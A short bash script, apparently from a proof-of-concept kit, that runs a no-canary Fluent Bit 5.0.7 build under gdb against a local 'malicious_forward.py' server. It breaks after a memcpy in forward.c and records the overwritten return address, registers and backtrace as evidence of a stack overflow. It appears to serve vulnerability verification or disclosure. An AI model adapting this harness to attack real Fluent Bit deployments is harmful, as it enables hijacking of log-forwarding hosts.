#!/usr/bin/env bash
# Observe the taken return address in a real no-canary Fluent Bit 5.0.7 flush.
# Loopback only. Usage: gdb_nocanary.sh <port>
set -u
PORT=$1
HERE=$(cd "$(dirname "$0")" && pwd)
OUT="$HERE/evidence"
mkdir -p "$OUT"
CONF="$OUT/gdb-nocanary.conf"
sed "s/@PORT@/$PORT/" "$HERE/victim.conf.in" > "$CONF"

python3 "$HERE/malicious_forward.py" --port "$PORT" > "$OUT/gdb-nocanary-server.log" 2>&1 &
SPID=$!
sleep 0.7

gdb -q -batch "${FB_BIN:-./bin-v507-nocanary}" \
  -ex 'set pagination off' \
  -ex 'break forward.c:568' \
  -ex "run -c $CONF" \
  -ex 'printf "=== AFTER MEMCPY ===\n"' \
  -ex 'p/x $rbp+8' \
  -ex 'x/gx $rbp+8' \
  -ex 'continue' \
  -ex 'printf "=== AFTER CONTINUE ===\n"' \
  -ex 'info registers rip rbp rsp' \
  -ex 'bt 4' \
  -ex 'printf "=== END ===\n"' \
  > "$OUT/gdb-nocanary.out" 2>&1
GRC=$?

kill -TERM "$SPID" 2>/dev/null || true
wait "$SPID" 2>/dev/null || true
echo "GDB_RC=$GRC"
cat "$OUT/gdb-nocanary.out"
echo "--- SERVER ---"
cat "$OUT/gdb-nocanary-server.log"
